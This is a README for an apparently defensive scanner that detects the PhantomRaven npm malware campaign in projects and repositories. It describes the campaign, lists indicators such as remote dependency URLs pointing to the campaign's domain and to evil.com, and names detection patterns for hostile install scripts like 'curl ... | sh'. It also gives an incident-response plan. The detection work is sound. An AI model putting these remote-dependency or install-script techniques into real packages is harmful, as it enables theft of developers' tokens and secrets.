# PhantomRaven Scanner

Universal npm malware detector for single projects or mass repository scanning.

## 📋 What is PhantomRaven?

PhantomRaven is a sophisticated npm malware campaign with **126 infected packages** and over **86,000 downloads**. It uses **Remote Dynamic Dependencies (RDD)** to hide malicious code from security scanners.

**Attack method:**
```json
{
  "dependencies": {
    "malicious": "http://packages.storeartifact.com/npm/package"
  }
}
```

The malicious code downloads during `npm install` via automatic `preinstall` scripts and steals:
- npm tokens (~/.npmrc)
- GitHub/GitLab credentials
- CI/CD secrets (GitHub Actions, GitLab CI, Jenkins, CircleCI)
- Environment variables and API keys

## 🚀 Quick Start

```bash
# Make executable
chmod +x phantomraven-scan.sh

# Scan current directory
./phantomraven-scan.sh

# Scan specific project
./phantomraven-scan.sh /path/to/project

# Scan 100+ repositories with 8 workers
./phantomraven-scan.sh --batch -w 8 ~/projects

# Generate JSON report
./phantomraven-scan.sh --batch -f json -o report.json ~/workspace
```

## 📖 Usage

### Single Project Mode (Default)

```bash
./phantomraven-scan.sh [OPTIONS] [path]

Options:
  -v, --verbose    Show detailed information
  -h, --help       Show help message
  [path]           Directory to scan (default: current directory)

Examples:
  ./phantomraven-scan.sh
  ./phantomraven-scan.sh /path/to/project
  ./phantomraven-scan.sh -v ~/my-app
```

### Batch Mode (Multiple Repositories)

```bash
./phantomraven-scan.sh --batch [OPTIONS] <directory|list_file>

Options:
  -w, --workers N      Number of parallel workers (default: 4)
  -f, --format FORMAT  Output format: text, json, csv
  -o, --output FILE    Save results to file
  --summary-only       Show only final summary
  -v, --verbose        Show detailed output for each repo

Examples:
  # Scan all repos in directory
  ./phantomraven-scan.sh --batch ~/projects

  # Fast scan with 16 workers
  ./phantomraven-scan.sh --batch -w 16 ~/workspace

  # Generate JSON report
  ./phantomraven-scan.sh --batch -f json -o report.json ~/repos

  # Scan from list file
  ./phantomraven-scan.sh --batch repos.txt

  # Quick summary
  ./phantomraven-scan.sh --batch --summary-only ~/workspace
```

## 🔍 What Gets Checked

### 1. Known Malicious Packages (126)
- `unused-imports`
- `eslint-comments`
- `transform-react-remove-prop-types`
- `crowdstrike`
- And 122 more from the PhantomRaven campaign

### 2. Remote Dynamic Dependencies (RDD)
HTTP/HTTPS URLs in dependencies:
```json
{
  "dependencies": {
    "pkg": "http://evil.com/package.tgz"
  }
}
```

### 3. Suspicious Git Dependencies
Git URLs to unknown hosts (not GitHub/GitLab/Bitbucket):
```json
{
  "dependencies": {
    "pkg": "git+https://suspicious.com/repo.git"
  }
}
```

### 4. Malicious Domain
Known PhantomRaven infrastructure:
- Domain: `packages.storeartifact.com`
- IP: `54.173.15.59`

### 5. Suspicious Install Scripts
Dangerous patterns in preinstall/postinstall/install scripts:
- `curl ... | sh`
- `wget ... | sh`
- `eval $(...)`
- `base64 -d` (decoding)
- Scripts in `/tmp`
- `chmod +x && ...`

### 6. Lock Files
Checks all lock files:
- `package-lock.json`
- `yarn.lock`
- `pnpm-lock.yaml`

## 📊 Output Formats

### Text (Default)
```
================================================
Scan Summary
================================================
Scanned: 150 | Clean: 148 | Infected: 2 | Errors: 0

⚠ INFECTED REPOSITORIES:
  ✗ /home/user/projects/app1
    Malicious package: unused-imports
  ✗ /home/user/projects/app2
    RDD: http://packages.storeartifact.com/...
```

### JSON
```json
{
  "scan_date": "2025-10-30T12:34:56Z",
  "total": 150,
  "clean": 148,
  "infected": 2,
  "errors": 0,
  "duration_seconds": 45,
  "infected_repositories": [
    {
      "path": "/home/user/projects/app1",
      "findings": "Malicious package: unused-imports"
    }
  ]
}
```

### CSV
```csv
Repository,Status,Findings
"/home/user/projects/app1",infected,"Malicious package: unused-imports"
"/home/user/projects/app2",clean,""
```

## 🎯 Use Cases

### CI/CD Integration

**GitHub Actions:**
```yaml
name: PhantomRaven Scan
on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Scan for malware
        run: |
          curl -O https://raw.githubusercontent.com/.../phantomraven-scan.sh
          chmod +x phantomraven-scan.sh
          ./phantomraven-scan.sh .
```

**GitLab CI:**
```yaml
security:scan:
  script:
    - curl -O https://raw.githubusercontent.com/.../phantomraven-scan.sh
    - chmod +x phantomraven-scan.sh
    - ./phantomraven-scan.sh .
  only:
    - merge_requests
    - main
```

### Pre-commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

if ! ./phantomraven-scan.sh . >/dev/null 2>&1; then
    echo "⚠️  PhantomRaven malware detected!"
    ./phantomraven-scan.sh .
    exit 1
fi
```

### Scheduled Scans

```bash
# Crontab: Daily scan at 2 AM
0 2 * * * /path/to/phantomraven-scan.sh --batch -f json -o /var/log/scan-$(date +\%Y\%m\%d).json ~/projects
```

### Organization Audit

```bash
# Scan all developer machines
for user in /home/*; do
    ./phantomraven-scan.sh --batch -f csv -o "audit-$(basename $user).csv" "$user/projects"
done

# Combine reports
cat audit-*.csv > organization-audit.csv
```

## 🚨 If Infected - Action Plan

### 1. Immediate Response
```bash
# Stop running processes
pkill node

# Backup current state (for forensics)
tar czf infected-backup-$(date +%Y%m%d).tar.gz package.json package-lock.json node_modules

# Remove infected code
rm -rf node_modules
rm package-lock.json yarn.lock pnpm-lock.yaml

# Edit package.json - remove malicious dependencies
```

### 2. Rotate ALL Credentials

```bash
# Check what may have been stolen
cat ~/.npmrc
cat ~/.gitconfig
env | grep -iE 'token|key|secret|password'

# List of credentials to rotate:
# - npm tokens
# - GitHub personal access tokens
# - GitLab tokens
# - CI/CD secrets (GitHub Actions, GitLab CI, CircleCI, Jenkins)
# - Cloud provider credentials (AWS, GCP, Azure)
# - Database credentials
# - API keys
```

### 3. Audit Systems

```bash
# Check network connections to malicious domain
grep -r "packages.storeartifact.com" /var/log/

# Review CI/CD logs
# Check git history for unauthorized commits
git log --all --since="2025-08-01" --author="@"

# Scan other projects
./phantomraven-scan.sh --batch ~/projects
```

### 4. Clean Reinstall

```bash
# Verify package.json is clean
./phantomraven-scan.sh .

# Reinstall from clean lock file (if you have one)
npm ci

# Or fresh install
npm install
```

### 5. Report

- Report to npm: https://www.npmjs.com/support
- Report to GitHub Security: security@github.com
- Document the incident for compliance/audit

## 📝 Creating Repository Lists

For batch mode, you can provide a text file with repository paths:

```bash
# repos.txt
/home/user/projects/app1
/home/user/projects/app2
# Comments are supported
/var/www/frontend
```

Generate automatically:

```bash
# All git repos
find ~/projects -name ".git" -type d | xargs -I {} dirname {} > repos.txt

# Recently modified (last 30 days)
find ~/projects -name ".git" -type d -mtime -30 | xargs -I {} dirname {} > recent.txt

# Specific organization
find ~/work -path "*/myorg-*/.git" -type d | xargs -I {} dirname {} > org-repos.txt
```

## ⚙️ Performance Tuning

Choose worker count based on your system:

```bash
# Get CPU cores
CORES=$(nproc)

# Conservative (I/O limited, network storage)
./phantomraven-scan.sh --batch -w $((CORES / 2)) ~/repos

# Balanced (recommended)
./phantomraven-scan.sh --batch -w $CORES ~/repos

# Aggressive (CPU limited, local SSD)
./phantomraven-scan.sh --batch -w $((CORES * 2)) ~/repos
```

**Benchmark (approximate times):**
| Repositories | Workers | Time     |
|-------------|---------|----------|
| 10          | 4       | ~5s      |
| 100         | 8       | ~45s     |
| 500         | 16      | ~3min    |
| 1000        | 32      | ~5min    |

## 🐛 Troubleshooting

### "No package.json files found"
```bash
# Check if directory has npm projects
find /path -name "package.json" | head

# May be in subdirectories
./phantomraven-scan.sh /path/to/parent/directory
```

### "Permission denied"
```bash
chmod +x phantomraven-scan.sh
```

### Slow batch scans
```bash
# Increase workers
./phantomraven-scan.sh --batch -w 16 ~/repos

# Use summary-only mode
./phantomraven-scan.sh --batch --summary-only ~/repos
```

### False positives
- Private Git repos (GitHub/GitLab) are flagged but may be legitimate
- Corporate npm proxies may appear suspicious
- Review findings manually before taking action

## 🔒 Exit Codes

- `0` - Clean (no malware found)
- `1` - Infected (malware detected)
- `2` - Errors during scan

Use in scripts:

```bash
if ./phantomraven-scan.sh /path/to/project; then
    echo "Clean ✓"
else
    echo "Infected! Taking action..."
    # Automated response here
fi
```

## 📚 Resources

- [PhantomRaven Analysis (Koi.ai)](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
- [npm Security Best Practices](https://docs.npmjs.com/security-and-permissions)
- [npm audit Documentation](https://docs.npmjs.com/cli/v8/commands/npm-audit)

## ⚠️ Limitations

This scanner detects **known PhantomRaven indicators**. It cannot detect:
- New malware variants
- Zero-day attacks
- Obfuscated code
- Other supply chain attacks

**Defense in depth strategy:**
- Regular `npm audit`
- Dependency pinning
- Lock file integrity checks
- Network monitoring
- Principle of least privilege
- Regular credential rotation

## 📄 License

Provided as-is for security scanning purposes.
